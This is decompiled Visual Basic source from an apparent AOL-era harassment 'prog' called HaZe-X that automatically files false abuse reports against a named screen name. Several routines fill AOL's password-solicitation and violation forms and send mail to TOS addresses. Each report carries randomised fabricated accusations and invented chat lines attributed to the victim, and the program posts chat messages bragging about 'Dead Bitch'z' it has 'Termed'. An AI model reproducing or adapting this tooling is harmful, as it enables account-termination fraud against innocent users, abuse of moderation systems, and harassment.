If  Silent.Checked = False Then
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·³ [gold] • Method • New KO Help"
sub30B0 "•-^v•HaZe-X²·³ [gold] • Phrase • " & Panel3D5
Call sub3278
End If
l0AAC% = extfn1520("AOL Frame25", 0&)
Call subD08("Keyword...", "&Go To")
Do
DoEvents
l0AAE = extfn24E0(l0AAC%, "Keyword")
Loop Until l0AAE <> 0
l0AB2 = extfn2518(l0AAE, "_AOL_Edit")
l0AB6 = extfn1718(l0AB2, c07E6, 0, "KO HELP")
l0ABA = extfn16E0(l0AB2, c0218, 13, 0)
Do
DoEvents
l0ABE% = extfn1520("AOL Frame25", 0&)
l0AC0 = extfn24E0(l0ABE%, "I Need Help!")
Loop Until l0AC0 > 0
l0AC4% = extfn2518(l0AC0, "_AOL_ICON")
l0AC6 = extfn1750(l0AC4%, c0074, 0, 0)
l0AC6 = extfn1750(l0AC4%, c007C, 0, 0)
subF38 .1#
l0ACA% = extfn24E0(l0AAC%, "I Need Help!")
l0ACC = extfn16E0(l0ACA%, c022E, 0, 0)
Do
DoEvents
l0AD0% = extfn24E0(l0AAC%, "Report Password Solicitations")
Loop Until l0AD0% > 0
l0AD6 = extfn16E0(l0AD2, c022E, 0, 0)
l0ADA = extfn2518(l0AAC%, "_AOL_edit")
l0ADE = extfn14E8(l0ADA, c0810)
l0AE2 = extfn14E8(l0ADE, c0810)
l0AE6 = extfn14E8(l0AE2, c0810)
l0AEA = extfn14E8(l0AE6, c0810)
l0AEE = extfn14E8(l0AEA, c0810)
l0AF2 = extfn14E8(l0AEE, c0810)
l0AF6 = extfn14E8(l0AF2, c0810)
l0AFA = extfn14E8(l0AF6, c0810)
l0ACC = extfn1718(l0AEA, c07E6, 0, Room)
l0AFE$ = Chr(10)
l0ACC = extfn1718(l0AF2, c07E6, 0, Room + ":" & " " & "" & Text1 & l0AFE$)
subF38 .3#
l0ABA = extfn16E0(l0AF6, c0218, 13, 0)
subFE0
Call sub3208
For l0B00 = 0 To Combo1.ListCount
l0B04$ = Combo1.List(l0B00)
If  Room = l0B04$ Then Exit Sub
Next
 Combo1.AddItem Room
End Sub

Sub list_Click ()
Dim l0B06 As String
Dim l0B08 As Variant
Dim l0B0C As Variant
Dim l0B10 As Variant
If  Combo2.ListCount = 0 Then
MsgBox "No dead people to brag.", , "Error"
Exit Sub
End If
Combo2.ListIndex = 0
sub30B0 "•-^v•HaZe-X²·³ [gold] • Dead Bitch'z"
sub30B0 "•-^v•HaZe-X²·³ [gold] • " & Combo2.ListCount & " Bitch'z Killed."
sub30B0 "•-^v• " & Combo2 & " " & l0B06$
subF38 .8#
Do
Combo2.ListIndex = Combo2.ListIndex + 1
Randomize
For l0B08 = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l0B0C = 6
    l0B10 = Int(Rnd * l0B0C + 1)
      If  l0B10 = 1 Then l0B06$ = "TOSed."
      If  l0B10 = 2 Then l0B06$ = "Termed."
      If  l0B10 = 3 Then l0B06$ = "Dead."
      If  l0B10 = 4 Then l0B06$ = "Killed."
      If  l0B10 = 5 Then l0B06$ = "Gone."
      If  l0B10 = 6 Then l0B06$ = "R.I.P."
      If  l0B10 = 7 Then l0B06$ = "Wasted."
      Next
      sub30B0 "•-^v• " & Combo2 & " " & l0B06$
    Loop Until Combo2.ListIndex = Combo2.ListCount - 1
Combo2.ListIndex = 0
sub30B0 "•-^v•HaZe-X²·³ [gold] • Buncha Dead Bitch'z - NEXT!"
End Sub

Sub lot_Click ()
Dim l0B14 As Variant
Dim l0B18 As Variant
Dim l0B1C As Variant
Dim l0B20 As String
Dim l0B22 As Variant
Dim l0B26() As Integer
Dim l0B2C As Integer
Dim l0B2E As Variant
Dim l0B32 As Variant
Dim l0B36 As String
Dim l0B38 As Variant
Dim l0B3C As Variant
Dim l0B40 As Variant
Dim l0B44 As Variant
Dim l0B48 As Variant
Dim l0B4C As Variant
Dim l0B50 As Variant
Dim l0B54 As String
If  Room = "" Then
MsgBox "Enter a name to TOS.", , "Error"
Exit Sub
End If
Randomize
For l0B14 = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l0B18 = 6
    l0B1C = Int(Rnd * l0B18 + 1)
      If  l0B1C = 1 Then l0B20$ = "" & Form1.Room & " asked for my password."
      If  l0B1C = 2 Then l0B20$ = "" & Form1.Room & " tried to hack my password."
      If  l0B1C = 3 Then l0B20$ = "Read!" & Form1.Room & " asked for my password."
      If  l0B1C = 4 Then l0B20$ = "Please do something about " & Form1.Room & "."
      If  l0B1C = 5 Then l0B20$ = "This guy wants my password:" & Form1.Room
      If  l0B1C = 6 Then l0B20$ = "Please help " & Form1.Room & " wants my password."
      If  l0B1C = 7 Then l0B20$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l0B22) Like "*KaOS*" Or UCase$(l0B22) Like "*NiPP*" Or UCase$(l0B22) Like "*CHOP*" Or UCase$(l0B22) Like "*LoRe*" Or UCase$(l0B22) Like "*CouNT*" Or UCase$(l0B22) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·³ [gold] • Method • LOTSEN"
sub30B0 "•-^v•HaZe-X²·³ [gold] • Phrase • " & Panel3D5
Call sub3278
End If
l0B2C% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l0B2E = extfn24E0(l0B2C%, "Compose Mail")
DoEvents
Loop Until l0B2E <> 0
l0B32 = fn5D0(l0B26(), l0B2E, "*", "_AOL_Edit", Null)
subF00 l0B26(1), "Lotsen"
subF00 l0B26(3), "" & l0B20$
l0B36$ = Chr(10)
subF00 l0B26(4), "" & Room & ":" & " " & "" & Text1 & l0B36$ & l0B36$
l0B38 = extfn24E0(l0B2E, "Send")
l0B3C = extfn2518(l0B2E, "_AOL_Icon")
l0B40 = extfn13D0(l0B3C, 2)
l0B44 = extfn13D0(l0B40, 2)
l0B48 = extfn1750(l0B3C, c0074, 0, 0&)
l0B4C = extfn1750(l0B3C, c007C, 0, 0&)
subF38 .4#
subFE0
If  Silent.Checked = True Then
Call sub34B0("" & Room & " now Termed.")
End If
If  Silent.Checked = False Then
Call sub3208
End If
For l0B50 = 0 To Form1.Combo1.ListCount
l0B54$ = Form1.Combo1.List(l0B50)
If  Room = l0B54$ Then Exit Sub
Next
 Form1.Combo1.AddItem Room
End Sub

Sub lotmi_Click ()
Dim l0B56 As Variant
Dim l0B5A As Variant
Dim l0B5E As Variant
Dim l0B62 As String
Dim l0B64 As Variant
Dim l0B68() As Integer
Dim l0B6E As Integer
Dim l0B70 As Variant
Dim l0B74 As Variant
Dim l0B78 As String
Dim l0B7A As Variant
Dim l0B7E As Variant
Dim l0B82 As Variant
Dim l0B86 As Variant
Dim l0B8A As Variant
Dim l0B8E As Variant
Dim l0B92 As Variant
Dim l0B96 As String
If  Room = "" Then
MsgBox "Enter a name to TOS.", , "Error"
Exit Sub
End If
Randomize
For l0B56 = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l0B5A = 6
    l0B5E = Int(Rnd * l0B5A + 1)
      If  l0B5E = 1 Then l0B62$ = "" & Form1.Room & " asked for my password."
      If  l0B5E = 2 Then l0B62$ = "" & Form1.Room & " tried to hack my password."
      If  l0B5E = 3 Then l0B62$ = "Read!" & Form1.Room & " asked for my password."
      If  l0B5E = 4 Then l0B62$ = "Please do something about " & Form1.Room & "."
      If  l0B5E = 5 Then l0B62$ = "This guy wants my password:" & Form1.Room
      If  l0B5E = 6 Then l0B62$ = "Please help " & Form1.Room & " wants my password."
      If  l0B5E = 7 Then l0B62$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l0B64) Like "*KaOS*" Or UCase$(l0B64) Like "*NiPP*" Or UCase$(l0B64) Like "*CHOP*" Or UCase$(l0B64) Like "*LoRe*" Or UCase$(l0B64) Like "*CouNT*" Or UCase$(l0B64) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·³ [gold] • Method • LOTSEN MI"
sub30B0 "•-^v•HaZe-X²·³ [gold] • Phrase • " & Panel3D5
Call sub3278
End If
l0B6E% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l0B70 = extfn24E0(l0B6E%, "Compose Mail")
DoEvents
Loop Until l0B70 <> 0
l0B74 = fn5D0(l0B68(), l0B70, "*", "_AOL_Edit", Null)
subF00 l0B68(1), "Lotsen MI"
subF00 l0B68(3), "" & l0B62$
l0B78$ = Chr(10)
subF00 l0B68(4), "" & Room & ":" & " " & "" & Text1 & l0B78$ & l0B78$
l0B7A = extfn24E0(l0B70, "Send")
l0B7E = extfn2518(l0B70, "_AOL_Icon")
l0B82 = extfn13D0(l0B7E, 2)
l0B86 = extfn13D0(l0B82, 2)
l0B8A = extfn1750(l0B7E, c0074, 0, 0&)
l0B8E = extfn1750(l0B7E, c007C, 0, 0&)
subF38 .4#
subFE0
If  Silent.Checked = True Then
Call sub34B0("" & Room & " now Termed.")
End If
If  Silent.Checked = False Then
Call sub3208
End If
For l0B92 = 0 To Form1.Combo1.ListCount
l0B96$ = Form1.Combo1.List(l0B92)
If  Room = l0B96$ Then Exit Sub
Next
 Form1.Combo1.AddItem Room
End Sub

Sub mail1_Click ()
Dim l0B98 As Variant
Dim l0B9C As Variant
Dim l0BA0 As Variant
Dim l0BA4 As String
Dim l0BA6 As Variant
Dim l0BAA() As Integer
Dim l0BB0 As Integer
Dim l0BB2 As Variant
Dim l0BB6 As Variant
Dim l0BBA As String
Dim l0BBC As Variant
Dim l0BC0 As Variant
Dim l0BC4 As Variant
Dim l0BC8 As Variant
Dim l0BCC As Variant
Dim l0BD0 As Variant
Dim l0BD4 As Variant
Dim l0BD8 As String
If  Room = "" Then
MsgBox "Enter a name to TOS.", , "Error"
Exit Sub
End If
Randomize
For l0B98 = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l0B9C = 6
    l0BA0 = Int(Rnd * l0B9C + 1)
      If  l0BA0 = 1 Then l0BA4$ = "" & Form1.Room & " asked for my password."
      If  l0BA0 = 2 Then l0BA4$ = "" & Form1.Room & " tried to hack my password."
      If  l0BA0 = 3 Then l0BA4$ = "Read!" & Form1.Room & " asked for my password."
      If  l0BA0 = 4 Then l0BA4$ = "Please do something about " & Form1.Room & "."
      If  l0BA0 = 5 Then l0BA4$ = "This guy wants my password:" & Form1.Room
      If  l0BA0 = 6 Then l0BA4$ = "Please help " & Form1.Room & " wants my password."
      If  l0BA0 = 7 Then l0BA4$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l0BA6) Like "*KaOS*" Or UCase$(l0BA6) Like "*NiPP*" Or UCase$(l0BA6) Like "*CHOP*" Or UCase$(l0BA6) Like "*LoRe*" Or UCase$(l0BA6) Like "*CouNT*" Or UCase$(l0BA6) Like "*SoSo*" Or UCase$(l0BA6) Like "*TaLoN*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·³ [gold] • Method • TOSEmail1"
sub30B0 "•-^v•HaZe-X²·³ [gold] • Phrase • " & Panel3D5
Call sub3278
End If
l0BB0% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l0BB2 = extfn24E0(l0BB0%, "Compose Mail")
DoEvents
Loop Until l0BB2 <> 0
l0BB6 = fn5D0(l0BAA(), l0BB2, "*", "_AOL_Edit", Null)
subF00 l0BAA(1), "TOSEmail1"
subF00 l0BAA(3), "" & l0BA4$
l0BBA$ = Chr(10) + Chr(3)
subF00 l0BAA(4), "" & Room & ":" & " " & "" & Text1 & l0BBA$ & l0BBA$
l0BBC = extfn24E0(l0BB2, "Send")
l0BC0 = extfn2518(l0BB2, "_AOL_Icon")
l0BC4 = extfn13D0(l0BC0, 2)
l0BC8 = extfn13D0(l0BC4, 2)
l0BCC = extfn1750(l0BC0, c0074, 0, 0&)
l0BD0 = extfn1750(l0BC0, c007C, 0, 0&)
subF38 .4#
subFE0
If  Silent.Checked = True Then
Call sub34B0("" & Room & " now Termed.")
End If
If  Silent.Checked = False Then
Call sub3208
For l0BD4 = 0 To Combo1.ListCount
l0BD8$ = Combo1.List(l0BD4)
If  Room = l0BD8$ Then Exit Sub
Next
 Combo1.AddItem Room
End If
End Sub

Sub mail2_Click ()
Dim l0BDA As Variant
Dim l0BDE As Variant
Dim l0BE2 As Variant
Dim l0BE6 As String
Dim l0BE8 As Variant
Dim l0BEC() As Integer
Dim l0BF2 As Integer
Dim l0BF4 As Variant
Dim l0BF8 As Variant
Dim l0BFC As String
Dim l0BFE As Variant
Dim l0C02 As Variant
Dim l0C06 As Variant
Dim l0C0A As Variant
Dim l0C0E As Variant
Dim l0C12 As Variant
Dim l0C16 As Variant
Dim l0C1A As String
If  Room = "" Then
MsgBox "Enter a name to TOS.", , "Error"
Exit Sub
End If
Randomize
For l0BDA = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l0BDE = 6
    l0BE2 = Int(Rnd * l0BDE + 1)
      If  l0BE2 = 1 Then l0BE6$ = "" & Form1.Room & " asked for my password."
      If  l0BE2 = 2 Then l0BE6$ = "" & Form1.Room & " tried to hack my password."
      If  l0BE2 = 3 Then l0BE6$ = "Read!" & Form1.Room & " asked for my password."
      If  l0BE2 = 4 Then l0BE6$ = "Please do something about " & Form1.Room & "."
      If  l0BE2 = 5 Then l0BE6$ = "This guy wants my password:" & Form1.Room
      If  l0BE2 = 6 Then l0BE6$ = "Please help " & Form1.Room & " wants my password."
      If  l0BE2 = 7 Then l0BE6$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l0BE8) Like "*KaOS*" Or UCase$(l0BE8) Like "*NiPP*" Or UCase$(l0BE8) Like "*CHOP*" Or UCase$(l0BE8) Like "*LoRe*" Or UCase$(l0BE8) Like "*CouNT*" Or UCase$(l0BE8) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·³ [gold] • Method • TOSEmail2"
sub30B0 "•-^v•HaZe-X²·³ [gold] • Phrase • " & Panel3D5
Call sub3278
End If
l0BF2% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l0BF4 = extfn24E0(l0BF2%, "Compose Mail")
DoEvents
Loop Until l0BF4 <> 0
l0BF8 = fn5D0(l0BEC(), l0BF4, "*", "_AOL_Edit", Null)
subF00 l0BEC(1), "TOSEmail2"
subF00 l0BEC(3), "" & l0BE6$
l0BFC$ = Chr(10) + Chr(3)
subF00 l0BEC(4), "" & Room & ":" & " " & "" & Text1 & l0BFC$ & l0BFC$
l0BFE = extfn24E0(l0BF4, "Send")
l0C02 = extfn2518(l0BF4, "_AOL_Icon")
l0C06 = extfn13D0(l0C02, 2)
l0C0A = extfn13D0(l0C06, 2)
l0C0E = extfn1750(l0C02, c0074, 0, 0&)
l0C12 = extfn1750(l0C02, c007C, 0, 0&)
subF38 .4#
subFE0
If  Silent.Checked = True Then
Call sub34B0("" & Room & " now Termed.")
End If
If  Silent.Checked = False Then
Call sub3208
End If
For l0C16 = 0 To Combo1.ListCount
l0C1A$ = Combo1.List(l0C16)
If  Room = l0C1A$ Then Exit Sub
Next
 Combo1.AddItem Room
End Sub

Sub mail3_Click ()
Dim l0C1C As Variant
Dim l0C20 As Variant
Dim l0C24 As Variant
Dim l0C28 As String
Dim l0C2A As Variant
Dim l0C34() As Integer
Dim l0C3A As Integer
Dim l0C3C As Variant
Dim l0C40 As Variant
Dim l0C44 As String
Dim l0C46 As Variant
Dim l0C4A As Variant
Dim l0C4E As Variant
Dim l0C52 As Variant
Dim l0C56 As Variant
Dim l0C5A As Variant
Dim l0C5E As Variant
Dim l0C62 As String
If  Room = "" Then
MsgBox "Enter a name to TOS.", , "Error"
Exit Sub
End If
Randomize
For l0C1C = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l0C20 = 6
    l0C24 = Int(Rnd * l0C20 + 1)
      If  l0C24 = 1 Then l0C28$ = "" & Form1.Room & " asked for my password."
      If  l0C24 = 2 Then l0C28$ = "" & Form1.Room & " tried to hack my password."
      If  l0C24 = 3 Then l0C28$ = "Read!" & Form1.Room & " asked for my password."
      If  l0C24 = 4 Then l0C28$ = "Please do something about " & Form1.Room & "."
      If  l0C24 = 5 Then l0C28$ = "This guy wants my password:" & Form1.Room
      If  l0C24 = 6 Then l0C28$ = "Please help " & Form1.Room & " wants my password."
      If  l0C24 = 7 Then l0C28$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l0C2A) Like "*KaOS*" Or UCase$(l0C2A) Like "*NiPP*" Or UCase$(l0C2A) Like "*CHOP*" Or UCase$(l0C2A) Like "*LoRe*" Or UCase$(l0C2A) Like "*CouNT*" Or UCase$(l0C2A) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·³ [gold] • Method • TOSEmail3r"
sub30B0 "•-^v•HaZe-X²·³ [gold] • Phrase • " & Panel3D3
Call sub3278
End If
l0C3A% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l0C3C = extfn24E0(l0C3A%, "Compose Mail")
DoEvents
Loop Until l0C3C <> 0
l0C40 = fn5D0(l0C34(), l0C3C, "*", "_AOL_Edit", Null)
subF00 l0C34(1), "TOSEmail3"
subF00 l0C34(3), "" & l0C28$
l0C44$ = Chr(10) + Chr(3)
subF00 l0C34(4), "" & Room & ":" & " " & "" & Text1 & l0C44$ & l0C44$
l0C46 = extfn24E0(l0C3C, "Send")
l0C4A = extfn2518(l0C3C, "_AOL_Icon")
l0C4E = extfn13D0(l0C4A, 2)
l0C52 = extfn13D0(l0C4E, 2)
l0C56 = extfn1750(l0C4A, c0074, 0, 0&)
l0C5A = extfn1750(l0C4A, c007C, 0, 0&)
subF38 .4#
subFE0
If  Silent.Checked = True Then
Call sub34B0("" & Room & " now Termed.")
End If
If  Silent.Checked = False Then
Call sub3208
End If
For l0C5E = 0 To Combo1.ListCount
l0C62$ = Combo1.List(l0C5E)
If  Room = l0C62$ Then Exit Sub
Next
 Combo1.AddItem Room
End Sub

Sub sub4440 ()
End Sub


Sub minii_Click ()
Form1.Hide
Form4.Show
End Sub

Sub sub44B0 ()
Dim l0C68 As String
Dim l0C6A As Variant
Dim l0C74 As Integer
Dim l0C76 As Variant
Dim l0C7A As Variant
Dim l0C7E As Variant
Dim l0C82 As Variant
Dim l0C86 As Integer
Dim l0C88 As Variant
Dim l0C8C As Integer
Dim l0C8E As Variant
Dim l0C92 As Integer
Dim l0C94 As Variant
Dim l0C98 As Variant
Dim l0C9C As Variant
Dim l0CA0 As Variant
Dim l0CA4 As Variant
Dim l0CA8 As Variant
Dim l0CAC As Variant
Dim l0CB0 As Variant
Dim l0CB4 As Variant
Dim l0CB8 As Variant
Dim l0CBC As Variant
Dim l0CC0 As Variant
Dim l0CC4 As Variant
Dim l0CC8 As Variant
Dim l0CCC As Variant
Dim l0CD0 As Variant
Dim l0CD4 As Variant
Dim l0CD8 As Variant
Dim l0CDC As Integer
Dim l0CDE As Integer
Dim l0CE0 As Integer
Dim l0CE2() As Integer
Dim l0CE8 As Variant
Dim l0CEC As Variant
Dim l0CF0 As Variant
Dim l0CF4 As Variant
Dim l0CF8 As Variant
Dim l0CFC As Variant
Dim l0D00 As Variant
Dim l0D04 As Variant
Dim l0D08 As Integer
Dim l0D0A As Variant
Dim l0D0E As Variant
Dim l0D12 As Variant
Dim l0D16 As Variant
Dim l0D1A As Variant
Dim l0D1E As Variant
Dim l0D22 As Variant
Dim l0D26 As Variant
Dim l0D2A As Variant
Dim l0D2E As Variant
Dim l0D32 As Variant
Dim l0D36 As Variant
Dim l0D3A As Variant
Dim l0D3E As Variant
Dim l0D42 As Variant
Dim l0D46 As Variant
Dim l0D4A As Variant
Dim l0D4E As Variant
Dim l0D52 As Variant
Dim l0D56 As Variant
Dim l0D5A As Variant
Dim l0D5E As Variant
Dim l0D62 As Variant
Dim l0D66 As Variant
Dim l0D6A As Variant
Dim l0D6E As Variant
Dim l0D72 As Variant
Dim l0D76 As Variant
Dim l0D7A As Variant
Dim l0D7E As Variant
Dim l0D82 As Variant
Dim l0D86 As Variant
Dim l0D8A As Variant
Dim l0D8E As Variant
Dim l0D92() As Integer
Dim l0D98 As Variant
Dim l0D9C As Variant
Dim l0DA0 As Variant
Dim l0DA4 As Variant
Dim l0DA8 As Variant
Dim l0DAC As Variant
Dim l0DB0 As Variant
Dim l0DB4 As Integer
Dim l0DB6 As Integer
Dim l0DB8 As Variant
Dim l0DBC As Variant
Dim l0DC0 As Variant
Dim l0DC4 As Integer
Dim l0DC6 As Integer
Dim l0DC8 As Variant
Dim l0DCC As String
If  UCase$(l0C6A) Like "*KaOS*" Or UCase$(l0C6A) Like "*NiPP*" Or UCase$(l0C6A) Like "*CHOP*" Or UCase$(l0C6A) Like "*LoRe*" Or UCase$(l0C6A) Like "*CouNT*" Or UCase$(l0C6A) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "°v^-•HaZe-X²·º•-^v° ‹› " & Room
sub30B0 "°v^-•HaZe-X²·º•-^v° ‹› Meth. - MultiMethod"
sub30B0 "°v^-•HaZe-X²·º•-^v° ‹› Phrase - " & Panel3D6
Call sub3278
End If
l0C74% = extfn1520("AOL Frame25", 0&)
Call subD08("Keyword...", "&Go To")
Do
DoEvents
l0C76 = extfn24E0(l0C74%, "Keyword")
Loop Until l0C76 <> 0
l0C7A = extfn2518(l0C76, "_AOL_Edit")
l0C7E = extfn1718(l0C7A, c07E6, 0, "GUIDEPAGER")
l0C82 = extfn16E0(l0C7A, c0218, 13, 0)
Do
DoEvents
l0C86% = extfn1520("AOL Frame25", 0&)
l0C88 = extfn24E0(l0C86%, "I Need Help!")
Loop Until l0C88 > 0
l0C8C% = extfn2518(l0C88, "_AOL_ICON")
l0C8E = extfn1750(l0C8C%, c0074, 0, 0)
l0C8E = extfn1750(l0C8C%, c007C, 0, 0)
subF38 .1#
l0C92% = extfn24E0(l0C74%, "I Need Help!")
l0C94 = extfn16E0(l0C92%, c022E, 0, 0)
Do
DoEvents
l0C98 = extfn24E0(l0C74%, "Report Password Solicitations")
Loop Until l0C98 <> 0
l0C7E = extfn16E0(l0C9C, c022E, 0, 0)
l0CA0 = extfn2518(l0C74%, "_AOL_Edit")
l0CA4 = extfn14E8(l0CA0, c0810)
l0CA8 = extfn14E8(l0CA4, c0810)
l0CAC = extfn14E8(l0CA8, c0810)
l0CB0 = extfn14E8(l0CAC, c0810)
l0CB4 = extfn14E8(l0CB0, c0810)
l0CB8 = extfn14E8(l0CB4, c0810)
l0CBC = extfn14E8(l0CB8, c0810)
l0CC0 = extfn14E8(l0CBC, c0810)
l0CC4 = extfn1718(l0CB8, c07E6, 0, Room)
l0C68$ = Chr(10)
l0CC4 = extfn1718(l0CC0, c07E6, 0, Room + ":" & " " & "" & Text1 & l0C68$ & l0C68$)
l0C82 = extfn16E0(l0CB8, c0218, 13, 0)
subF38 .5#
subFE0
subF38 .2#
l0C74% = extfn1520("AOL Frame25", 0&)
Call subD08("Keyword...", "&Go To")
Do
DoEvents
l0C76 = extfn24E0(l0C74%, "Keyword")
Loop Until l0C76 <> 0
l0C7A = extfn2518(l0C76, "_AOL_Edit")
l0C7E = extfn1718(l0C7A, c07E6, 0, "KOHELP")
l0C82 = extfn16E0(l0C7A, c0218, 13, 0)
Do
DoEvents
l0CC8 = extfn24E0(l0C74%, "GUIDEPAGER FOR KIDS")
DoEvents
Loop Until l0CC8 <> 0
l0CCC = extfn24E0(l0CC8, "Report Password Solicitation")
l0CD0 = extfn2518(l0CC8, "_AOL_icon")
l0CD4 = extfn14E8(l0CD0, c0810)
l0CD8 = extfn14E8(l0CD4, c0810)
subF38 .1#
l0CDC% = extfn1750(l0CD8, c0074, 0, 0&)
l0CDC% = extfn1750(l0CD8, c007C, 0, 0&)
subF38 .1#
l0CDE% = extfn24E0(l0C74%, "GUIDEPAGER FOR KIDS")
l0C94 = extfn1750(l0CDE%, c022E, 0, 0)
Do
DoEvents
l0CE0% = extfn24E0(l0C74%, "Report Password Solicitations")
Loop Until l0CE0% > 0
l0CA0 = extfn2518(l0C74%, "_AOL_edit")
l0CA4 = extfn14E8(l0CA0, c0810)
l0CA8 = extfn14E8(l0CA4, c0810)
l0CAC = extfn14E8(l0CA8, c0810)
l0CB0 = extfn14E8(l0CAC, c0810)
l0CB4 = extfn14E8(l0CB0, c0810)
l0CB8 = extfn14E8(l0CB4, c0810)
l0CBC = extfn14E8(l0CB8, c0810)
l0CC0 = extfn14E8(l0CBC, c0810)
l0C94 = extfn1718(l0CB8, c07E6, 0, Room)
l0C94 = extfn1718(l0CC0, c07E6, 0, Room + ":" & " " & "" & Text1)
l0C82 = extfn16E0(l0CB8, c0218, 13, 0)
subF38 .5#
subFE0
subF38 .2#
l0C74% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l0CE8 = extfn24E0(l0C74%, "Compose Mail")
DoEvents
Loop Until l0CE8 <> 0
l0CEC = fn5D0(l0CE2(), l0CE8, "*", "_AOL_Edit", Null)
subF00 l0CE2(1), "TOSEmail2,TOSEmail3,TOSKids,TOS IM1,TOSGeneral,TOSStaff1,TOSBoards1"
subF00 l0CE2(3), "Password Solicitation"
l0C68$ = Chr(10)
subF00 l0CE2(4), "" & Room & ":" & " " & "" & Text1 & l0C68$ & l0C68$
l0CF0 = extfn24E0(l0CE8, "Send")
l0CF4 = extfn2518(l0CE8, "_AOL_Icon")
l0CF8 = extfn13D0(l0CF4, 2)
l0CFC = extfn13D0(l0CF8, 2)
l0D00 = extfn1750(l0CF4, c0074, 0, 0&)
l0D04 = extfn1750(l0CF4, c007C, 0, 0&)
subF38 .4#
subFE0
subF38 .2#
Call subD08("Keyword...", "&Go To")
l0D08% = extfn1520("AOL Frame25", 0&)
Do
DoEvents
l0D0A = extfn24E0(l0D08%, "Keyword")
Loop Until l0D0A <> 0
l0D0E = extfn2518(l0D0A, "_AOL_Edit")
l0D12 = extfn1718(l0D0E, c07E6, 0, "Guidepager")
l0D16 = extfn16E0(l0D0E, c0218, 13, 0)
Do
DoEvents
l0D1A = extfn24E0(l0D08%, "I Need Help!")
Loop Until l0D1A <> 0
l0D1E = extfn2518(l0D1A, "_AOL_Icon")
l0D22 = extfn13D0(l0D1E, 2)
l0D26 = extfn13D0(l0D22, 2)
l0D2A = extfn13D0(l0D26, 2)
l0D2E = extfn13D0(l0D2A, 2)
l0D32 = extfn1750(l0D26, c0074, 0, 0&)
l0D36 = extfn1750(l0D26, c007C, 0, 0&)
subF38 .1#
l0C92% = extfn24E0(l0C74%, "I Need Help!")
l0C94 = extfn16E0(l0C92%, c022E, 0, 0)
Do
DoEvents
l0D3A = extfn24E0(l0D08%, "Report A Violation")
Loop Until l0D3A <> 0
l0D3E = extfn2518(l0D3A, "_AOL_Icon")
l0D42 = extfn13D0(l0D3E, 2)
l0D46 = extfn13D0(l0D42, 2)
l0D4A = extfn13D0(l0D46, 2)
l0D4E = extfn13D0(l0D4A, 2)
l0D52 = extfn13D0(l0D4E, 2)
l0D56 = extfn13D0(l0D52, 2)
l0D5A = extfn13D0(l0D56, 2)
l0D5E = extfn13D0(l0D5A, 2)
l0D62 = extfn13D0(l0D5E, 2)
l0D32 = extfn1750(l0D5E, c0074, 0, 0&)
l0D36 = extfn1750(l0D5E, c007C, 0, 0&)
Do
DoEvents
l0D66 = extfn24E0(l0D08%, "Violations via instant Messages")
Loop Until l0D66 <> 0
subF38 .1#
l0C92% = extfn24E0(l0C74%, "Report A Violation")
l0C94 = extfn16E0(l0C92%, c022E, 0, 0)
l0D0E = extfn2518(l0D66, "_AOL_Edit")
l0D6A = extfn13D0(l0D0E, 2)
l0D6E = extfn13D0(l0D6A, 2)
l0D72 = extfn13D0(l0D6E, 2)
l0D76 = extfn13D0(l0D72, 2)
l0D7A = extfn13D0(l0D76, 2)
l0D7E = extfn13D0(l0D7A, 2)
l0D82 = extfn13D0(l0D7E, 2)
l0D86 = extfn13D0(l0D82, 2)
l0D12 = extfn1718(l0D0E, c07E6, 0, Date)
l0D12 = extfn1718(l0D6E, c07E6, 0, Time)
l0D12 = extfn1718(l0D76, c07E6, 0, "Town Square")
l0D12 = extfn1718(l0D7E, c07E6, 0, "Lobby 17")
l0D12 = extfn1718(l0D86, c07E6, 0, Room + ":" & " " + Text1)
l0D8A = extfn2518(l0D66, "_AOL_Button")
l0D32 = extfn1750(l0D8A, c0074, 0, 0&)
l0D36 = extfn1750(l0D8A, c007C, 0, 0&)
